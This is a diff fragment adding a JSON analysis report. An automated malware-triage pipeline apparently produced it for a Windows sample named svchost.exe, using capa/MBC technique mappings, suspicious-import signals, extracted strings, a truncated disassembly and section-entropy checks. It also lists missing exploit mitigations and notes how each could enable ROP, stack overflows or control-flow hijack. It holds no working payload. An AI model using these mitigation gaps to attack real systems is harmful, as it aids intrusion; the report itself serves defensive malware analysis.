+          {
+            "parts": [
+              "Discovery",
+              "System Information Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "System Information Discovery",
+            "method": "",
+            "id": "E1082"
+          }
+        ]
+      },
+      {
+        "name": "get disk size",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "System Information Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "System Information Discovery",
+            "subtechnique": "",
+            "id": "T1082"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "System Information Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "System Information Discovery",
+            "method": "",
+            "id": "E1082"
+          }
+        ]
+      },
+      {
+        "name": "check OS version",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "System Information Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "System Information Discovery",
+            "subtechnique": "",
+            "id": "T1082"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "System Information Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "System Information Discovery",
+            "method": "",
+            "id": "E1082"
+          }
+        ]
+      },
+      {
+        "name": "query or enumerate registry value",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "Query Registry"
+            ],
+            "tactic": "Discovery",
+            "technique": "Query Registry",
+            "subtechnique": "",
+            "id": "T1012"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Operating System",
+              "Registry",
+              "Query Registry Value"
+            ],
+            "objective": "Operating System",
+            "behavior": "Registry",
+            "method": "Query Registry Value",
+            "id": "C0036.006"
+          }
+        ]
+      },
+      {
+        "name": "delete registry value",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Modify Registry"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Modify Registry",
+            "subtechnique": "",
+            "id": "T1112"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Operating System",
+              "Registry",
+              "Delete Registry Value"
+            ],
+            "objective": "Operating System",
+            "behavior": "Registry",
+            "method": "Delete Registry Value",
+            "id": "C0036.007"
+          }
+        ]
+      }
+    ],
+    "timeout_s": 60,
+    "sample_size": 104448,
+    "duration_s": 1.35,
+    "engine": "malcat-capa",
+    "capa_bin": "/opt/malcat/bin/malcat.capa.py"
+  },
+  "pe_imports": {
+    "engine": "pe_imports",
+    "sample_size": 104448,
+    "duration_s": 0.05,
+    "import_count": 156,
+    "signal_count": 8,
+    "signals": [
+      {
+        "label": "check_debugger",
+        "api_match": "IsDebuggerPresent",
+        "attack": [
+          "T1622"
+        ]
+      },
+      {
+        "label": "crypto_encrypt",
+        "api_match": "CryptEncrypt",
+        "attack": [
+          "T1573"
+        ]
+      },
+      {
+        "label": "http_client",
+        "api_match": "InternetOpen",
+        "attack": [
+          "T1071.001"
+        ]
+      },
+      {
+        "label": "set_registry_value",
+        "api_match": "RegSetValue",
+        "attack": [
+          "T1112"
+        ]
+      },
+      {
+        "label": "create_process",
+        "api_match": "CreateProcess",
+        "attack": [
+          "T1106"
+        ]
+      },
+      {
+        "label": "shell_execute",
+        "api_match": "ShellExecute",
+        "attack": [
+          "T1106"
+        ]
+      },
+      {
+        "label": "load_library",
+        "api_match": "LoadLibrary",
+        "attack": [
+          "T1129"
+        ]
+      },
+      {
+        "label": "get_proc_address",
+        "api_match": "GetProcAddress",
+        "attack": [
+          "T1129"
+        ]
+      }
+    ],
+    "hint": "PE import high-signal map (pefile). Not capa."
+  },
+  "floss": {
+    "floss_ok": true,
+    "string_count": 554,
+    "strings_sampled": 80,
+    "strings": [
+      "!This program cannot be run in DOS mode.",
+      "`.rdata",
+      "@.data",
+      ".reloc",
+      "tTh@9A",
+      "SSSSSS",
+      "PSWh[4@",
+      "zv:j%j",
+      "TSVWj@3",
+      "QSSjPSSSPS",
+      "PWWhP=A",
+      "9D$du4",
+      "6QVWWS",
+      "YYhx=A",
+      "D$D+D$@",
+      "D$\"j\\Xf",
+      "|$4;|$8",
+      "D$$PWWWW",
+      "s89D$Dw2+D$Dj",
+      "!;|$Lu",
+      "8;t$8u",
+      "9|$4t#",
+      "jXh`MA",
+      "^SSSSS",
+      "v\tN+D$",
+      "t$<\"u\t3",
+      "< tK<\ttG",
+      "j@j ^V",
+      "URPQQh",
+      "t\"SS9] u",
+      "PPPPPPPP",
+      ";t$,v-",
+      "UQPXY]Y[",
+      "QQSVWd",
+      "t*=RCC",
+      ";7|G;p",
+      "tR99u2",
+      "Unknown exception",
+      "CorExitProcess",
+      "HH:mm:ss",
+      "dddd, MMMM dd, yyyy",
+      "MM/dd/yy",
+      "December",
+      "November",
+      "October",
+      "September",
+      "August",
+      "February",
+      "January",
+      "Saturday",
+      "Friday",
+      "Thursday",
+      "Wednesday",
+      "Tuesday",
+      "Monday",
+      "Sunday",
+      "FlsFree",
+      "FlsSetValue",
+      "FlsGetValue",
+      "FlsAlloc",
+      "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
+      "Complete Object Locator'",
+      "Class Hierarchy Descriptor'",
+      "Base Class Array'",
+      "Base Class Descriptor at (",
+      "Type Descriptor'",
+      "`local static thread guard'",
+      "`managed vector copy constructor iterator'",
+      "`vector vbase copy constructor iterator'",
+      "`vector copy constructor iterator'",
+      "`dynamic atexit destructor for '",
+      "`dynamic initializer for '",
+      "`eh vector vbase copy constructor iterator'",
+      "`eh vector copy constructor iterator'",
+      "`managed vector destructor iterator'",
+      "`managed vector constructor iterator'",
+      "`placement delete[] closure'",
+      "`placement delete closure'",
+      "`omni callsig'",
+      "delete[]"
+    ],
+    "per_category": {
+      "decoded_strings": 0,
+      "stack_strings": 0,
+      "tight_strings": 0,
+      "language_strings": 0,
+      "language_strings_missed": 0,
+      "static_strings": 554
+    },
+    "raw_key_total": 3,
+    "floss_profile": "full",
+    "floss_language": "none",
+    "duration_s": 42.59,
+    "size_bytes": 104448,
+    "static_only": false,
+    "size_exceeded_deobfuscate_limit": false
+  },
+  "dotnet": {
+    "is_dotnet": false,
+    "runtime_version": null,
+    "assembly_name": null,
+    "module_name": null,
+    "language_hint": null,
+    "external_assembly_refs": [],
+    "suspicious_native_refs": [],
+    "suspicious_methods": [],
+    "interesting_pinvoke": [],
+    "has_suppress_ildasm": false,
+    "shellcode_embed_hint": false,
+    "il_total_lines": 0,
+    "il_excerpt": ""
+  },
+  "r2_decomp": {
+    "r2_ok": true,
+    "sample": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+    "disassembly": {
+      "0x0040ab74": "\u250c 329: entry0 ();\n\u2502       \u254e   ; var int32_t var_4h @ ebp-0x4\n\u2502       \u254e   ; var int32_t var_1ch @ ebp-0x1c\n\u2502       \u254e   ; var int32_t var_20h @ ebp-0x20\n\u2502       \u254e   ; var int32_t var_38h @ ebp-0x38\n\u2502       \u254e   ; var int32_t var_3ch @ ebp-0x3c\n\u2502       \u254e   ; var int32_t var_68h @ ebp-0x68\n\u2502       \u254e   0x0040ab74      e880260000     call 0x40d1f9\n\u2502       \u2514\u2500< 0x0040ab79      e989feffff     jmp 0x40aa07\n            ; CALL XREF from main @ 0x40420a(x)\n..",
+      "0x00404044": "; CALL XREF from entry0 @ 0x40ab1c(x)\n\u250c 2266: int main (int argc, char **argv, char **envp);\n\u2502           ; var int32_t var_10h @ ebp+0x34c\n\u2502           ; var int32_t var_4h @ ebp+0xd0\n\u2502           ; var int32_t var_14h @ ebp+0xc0\n\u2502           ; var int32_t var_15h @ ebp+0xbf\n\u2502           ; var int32_t var_28h @ ebp+0xac\n\u2502           ; var int32_t var_2ch @ ebp+0xa8\n\u2502           ; var int32_t var_30h @ ebp+0xa4\n\u2502           ; var int32_t var_54h @ ebp+0x80\n\u2502           ; var int32_t var_58h @ ebp+0x7c\n\u2502           ; var int32_t var_b0h @ ebp+0x24\n\u2502           ; var int32_t var_4h_2 @ ebp-0x4\n\u2502           ; var int32_t var_e8h @ ebp-0x14\n\u2502           ; var int32_t var_f4h @ ebp-0x20\n\u2502           ; var int32_t var_f8h @ ebp-0x24\n\u2502           ; var int32_t var_28h_2 @ ebp-0x28\n\u2502           ; var int32_t var_100h @ ebp-0x2c\n\u2502           ; var int32_t var_104h @ ebp-0x30\n\u2502           ; var int32_t var_38h @ ebp-0x38\n\u2502           ; var int32_t var_3ch @ ebp-0x3c\n\u2502           ; var int32_t var_114h @ ebp-0x40\n\u2502           ; var int32_t var_11ch @ ebp-0x48\n\u2502           ; var int32_t var_120h @ ebp-0x4c\n\u2502           ; var int32_t var_54h_2 @ ebp-0x54\n\u2502           ; var int32_t var_130h @ ebp-0x5c\n\u2502           ; var int32_t var_15h_2 @ ebp-0x5d\n\u2502           ; var int32_t var_138h @ ebp-0x64\n\u2502           ; var int32_t var_13ch @ ebp-0x68\n\u2502           ; var int32_t var_24h @ ebp-0x6c\n\u2502           ; var int32_t var_2ch_2 @ ebp-0x74\n\u2502           ; var int32_t var_14ch @ ebp-0x78\n\u2502           ; var int32_t var_154h @ ebp-0x80\n\u2502           ; var int32_t var_158h @ ebp-0x84\n\u2502           ; var int32_t var_168h @ ebp-0x94\n\u2502           ; var int32_t var_50h @ ebp-0x98\n\u2502           ; var int32_t var_58h_2 @ ebp-0xa0\n\u2502           ; var int32_t var_5ch @ ebp-0xa4\n\u2502           ; var int32_t var_60h @ ebp-0xa8\n\u2502           ; var int32_t var_64h @ ebp-0xac\n\u2502           ; var int32_t var_184h @ ebp-0xb0\n\u2502           ; var int32_t var_6ch @ ebp-0xb4\n\u2502           ; var int32_t var_70h @ ebp-0xb8\n\u2502           ; var int32_t var_74h @ ebp-0xbc\n\u2502           ; var int32_t var_78h @ ebp-0xc0\n\u2502           ; var int32_t var_7ch @ ebp-0xc4\n\u2502           ; var int32_t var_80h @ ebp-0xc8\n\u2502           ; var int32_t var_1a0h @ ebp-0xcc\n\u2502           ; var int32_t var_88h @ ebp-0xd0\n\u2502           ; var int32_t var_8ch @ ebp-0xd4\n\u2502           ; var int32_t var_90h @ ebp-0xd8\n\u2502           ; var int32_t var_94h @ ebp-0xdc\n\u2502           ; var int32_t var_1bch @ ebp-0xe8\n\u2502           ; var int32_t var_b0h_2 @ ebp-0xf8\n\u2502           ; var int32_t var_b8h @ ebp-0x100\n\u2502           ; var int32_t var_1d8h @ ebp-0x104\n\u2502           ; var int32_t var_cch @ ebp-0x114\n\u2502           ; var int32_t var_d4h @ ebp-0x11c\n\u2502           ; var int32_t var_1f4h @ ebp-0x120\n\u2502           ; var int32_t var_e8h_2 @ ebp-0x130\n\u2502           ; var int32_t var_210h @ ebp-0x13c\n\u2502           ; var int32_t var_f8h_2 @ ebp-0x140\n\u2502           ; var int32_t var_104h_2 @ ebp-0x14c\n\u2502           ; var int32_t var_22ch @ ebp-0x158\n\u2502           ; var int32_t var_114h_2 @ ebp-0x15c\n\u2502           ; var in"
+    },
+    "engine": "pdf (disasm)",
+    "fallback": true,
+    "functions_attempted": [
+      "0x0040ab74",
+      "0x00404044"
+    ]
+  },
+  "upx": {
+    "upx_ok": false,
+    "is_packed": false,
+    "sample": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+    "upx_probe_stdout": "                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2026\nUPX 5.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 7th 2026\n\n\nTested 0 file"
+  },
+  "xor": {
+    "xorsearch_ok": true,
+    "sample": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+    "candidates": [
+      "Found XOR 00 position 00000000: 000000D8 ........!..L.!This program cannot be r"
+    ],
+    "xorsearch_stdout": "Found XOR 00 position 00000000: 000000D8 ........!..L.!This program cannot be r\n",
+    "xorsearch_stderr": "",
+    "xorsearch_returncode": 0
+  },
+  "speakeasy": {
+    "speakeasy_ok": true,
+    "sample": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+    "module_base": null,
+    "entry_point": null,
+    "key_events": [],
+    "api_calls": [],
+    "strings": []
+  },
+  "frida_probe": {
+    "frida_available": true,
+    "frida_version": "17.16.4",
+    "pe_probe": {
+      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+      "exists": true,
+      "hook_candidates": [
+        "KERNEL32.dll!EnterCriticalSection",
+        "KERNEL32.dll!LeaveCriticalSection",
+        "KERNEL32.dll!GetCurrentThread",
+        "KERNEL32.dll!FindNextFileW",
+        "KERNEL32.dll!GetDiskFreeSpaceExW",
+        "USER32.dll!DrawTextW",
+        "USER32.dll!SystemParametersInfoW",
+        "USER32.dll!ReleaseDC",
+        "USER32.dll!FrameRect",
+        "USER32.dll!FillRect",
+        "GDI32.dll!CreateSolidBrush",
+        "GDI32.dll!GetDIBits",
+        "GDI32.dll!GetObjectA",
+        "GDI32.dll!SetBkMode",
+        "GDI32.dll!SetTextColor",
+        "ADVAPI32.dll!CryptCreateHash",
+        "ADVAPI32.dll!AccessCheck",
+        "ADVAPI32.dll!MapGenericMask",
+        "ADVAPI32.dll!DuplicateToken",
+        "ADVAPI32.dll!OpenThreadToken",
+        "SHELL32.dll!SHGetFolderPathW",
+        "SHELL32.dll!ShellExecuteW",
+        "WININET.dll!InternetOpenA",
+        "WININET.dll!InternetCloseHandle",
+        "WININET.dll!InternetSetOptionA",
+        "WININET.dll!HttpOpenRequestA",
+        "WININET.dll!InternetQueryOptionA",
+        "MPR.dll!WNetEnumResourceW",
+        "MPR.dll!WNetCloseEnum",
+        "MPR.dll!WNetAddConnection2W"
+      ]
+    }
+  },
+  "shellcode": {
+    "shellcode_ok": false,
+    "sample": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
+    "sections_analyzed": [
+      {
+        "name": ".text",
+        "size": 64512,
+        "entropy": 6.5809,
+        "executable": true,
+        "writable": false
+      },
+      {
+        "name": ".rdata",
+        "size": 26112,
+        "entropy": 4.6522,
+        "executable": false,
+        "writable": false
+      },
+      {
+        "name": ".data",
+        "size": 3584,
+        "entropy": 2.8833,
+        "executable": false,
+        "writable": true
+      },
+      {
+        "name": ".reloc",
+        "size": 9216,
+        "entropy": 4.711,
+        "executable": false,
+        "writable": false
+      }
+    ],
+    "error": "no high-entropy executable/writable shellcode-size section found"
+  },
+  "revai_tools_sec": {
+    "format": "pe",
+    "findings": [
+      {
+        "name": "Address Space Layout Randomization",
+        "present": false,
+        "claimed": false,
+        "note": "no DYNAMIC_BASE flag",
+        "consequence": "Without ASLR the image loads at a fixed base \u2014 a predictable address for ret2libc-style exploitation and ROP gadget pivots."
+      },
+      {
+        "name": "64-bit high-entropy ASLR",
+        "present": false,
+        "claimed": false,
+        "note": "64-bit high-entropy ASLR flag not set",
+        "consequence": "Without 64-bit entropy the entropy of the address space is reduced relative to the full 64-bit layout."
+      },
+      {
+        "name": "Data Execution Prevention",
+        "present": true,
+        "claimed": true,
+        "note": "Data Execution Prevention flag set",
+        "consequence": "Without NX-compat, writable memory can be executable \u2014 classic shellcode-on-stack/heap works directly."
+      },
+      {
+        "name": "Control Flow Guard",
+        "present": false,
+        "claimed": false,
+        "note": "no GUARD_CF flag",
+        "consequence": "Without CFG, indirect calls are unvalidated \u2014 vtable and function-pointer overwrites become direct code-flow hijack."
+      },
+      {
+        "name": "Structured Exception Handling",
+        "present": true,
+        "claimed": false,
+        "note": "no NO_SEH flag \u2014 SEH handlers may exist",
+        "consequence": "The NO_SEH flag claims no SEH handlers exist; if a handler is still present the claim is false \u2014 an exception can overwrite the handler chain for control-flow hijack."
+      },
+      {
+        "name": "Signed-image enforcement",
+        "present": false,
+        "claimed": false,
+        "note": "Signed-image enforcement flag not set",
+        "consequence": "Without forced integrity, a tampered image is not rejected by the loader's integrity checks."
+      },
+      {
+        "name": "Stack cookie (/GS)",
+        "present": false,
+        "claimed": false,
+        "note": "no __security_cookie reference found",
+        "consequence": "Without a stack cookie, linear buffer overflows can overwrite the return address directly on the stack."
+      }
+    ],
+    "engine": "revai_tools_sec",
+    "source": "revai_tools"
+  },
+  "revai_tools_sinks": {
+    "format": "pe",
+    "entry_point": "0x1000",
+    "sink_count": 7,
+    "sinks": [
+      {
+        "api": "createprocessw",
+        "dll": "KERNEL32.dll",
+        "class": "command_execution",
+        "address": "0x406166",
+        "function": "fcn.0040611c"
+      },
+      {
+        "api": "heapalloc",
+        "dll": "KERNEL32.dll",
+        "class": "integer_overflow_size",
+        "address": "0x40a663",
+        "function": "fcn.0040a61e"
+      },
+      {
+        "api": "heapalloc",
+        "dll": "KERNEL32.dll",
+        "class": "integer_overflow_size",
+        "address": "0x40dc46",
+        "function": "fcn.0040dc03"
+      },
+      {
+        "api": "cryptgenrandom",
+        "dll": "ADVAPI32.dll",
+        "class": "strong_randomness",
+        "address": "0x402000",
+        "function": "fcn.00401c7a"
+      },
+      {
+        "api": "cryptgenrandom",
+        "dll": "ADVAPI32.dll",
+        "class": "strong_randomness",
+        "address": "0x4023fd",
+        "function": "fcn.004023c6"
+      },
+      {
+        "api": "cryptgenrandom",
+        "dll": "ADVAPI32.dll",
+        "class": "strong_randomness",
+        "address": "0x4076af",
+        "function": "fcn.0040769d"
+      },
+      {
+        "api": "shellexecutew",
+        "dll": "SHELL32.dll",
+        "class": "command_execution",
+        "address": "0x403fdb",
+        "function": "fcn.00403d8a"
+      }
+    ],
+    "engine": "revai_tools_sinks",
+    "source": "revai_tools"
+  },
+  "revai_tools_audit": {
+    "format": "pe",
+    "findings": [],
+    "engine": "revai_tools_audit",
+    "source": "revai_tools"
+  },
+  "packer": {
+    "engine": "packer_intake",
+    "ok": true,
+    "label": "none",
+    "score": 2,
+    "sections": [
+      {
+        "name": ".text",
+        "entropy": 6.581,
+        "raw_size": 64512,
+        "virtual_size": 64287,
+        "exec": true,
+        "writable": false
+      },
+      {
+        "name": ".rdata",
+        "entropy": 4.652,
+        "raw_size": 26112,
+        "virtual_size": 25624,
+        "exec": false,
+        "writable": false
+      },
+      {
+        "name": ".data",
+        "entropy": 2.883,
+        "raw_size": 3584,
+        "virtual_size": 7140,
+        "exec": false,
+        "writable": true
+      },
+      {
+        "name": ".reloc",
+        "entropy": 4.711,
+        "raw_size": 9216,
+        "virtual_size": 8856,
+        "exec": false,
+        "writable": false
+      }
+    ],
+    "checks": {
+      "last_section_exec": false,
+      "last_section_writable": false,
+      "first_section_writable": false,
+      "ep_in_last_section": false,
+      "ep_not_in_first_section": false,
+      "raw_vs_virtual_mismatch": false,
+      "memory_only_section": false,
+      "high_entropy_exec_section": true,
+      "few_imports": false,
+      "section_count_outlier": false
+    },
+    "embedded_payload_hint": false,
+    "entry_point": 4238196,
+    "ep_section": ".text",
+    "import_count": 8,
+    "imports_sample": [
+      "EnterCriticalSection",
+      "LeaveCriticalSection",
+      "GetCurrentThread",
+      "FindNextFileW",
+      "GetDiskFreeSpaceExW",
+      "GetVolumeInformationW",
+      "GetLogicalDrives",
+      "GetDriveTypeW",
+      "DeleteCriticalSection",
+      "LoadLibraryW",
+      "RtlUnwind",
+      "InitializeCriticalSection",
+      "GetSystemTime",
+      "GetTempFileNameW",
+      "CreateProcessW",
+      "GetModuleHandleA",
+      "GetProcAddress",
+      "GetCurrentProcess",
+      "FindFirstFileW",
+      "GetVolumeNameForVolumeMountPointA",
+      "GetWindowsDirectoryA",
+      "GetLocaleInfoA",
+      "FindClose",
+      "MultiByteToWideChar",
+      "WideCharToMultiByte",
+      "WaitForSingleObject",
+      "CreateThread",
+      "CopyFileW",
+      "GetTempPathW",
+      "Sleep",
+      "GetUserDefaultUILanguage",
+      "GetUserDefaultLangID",
+      "GetSystemDefaultLangID",
+      "SetUnhandledExceptionFilter",
+      "SetErrorMode",
+      "MulDiv",
+      "GetVersionExA",
+      "ExitProcess",
+      "GetModuleFileNameW",
+      "GetLastError"
+    ],
+    "elapsed_s": 0.007,
+    "note": "Deterministic entropy + packer checklist; heuristic label, unpacking loop still required for non-UPX packers."
+  }
+}
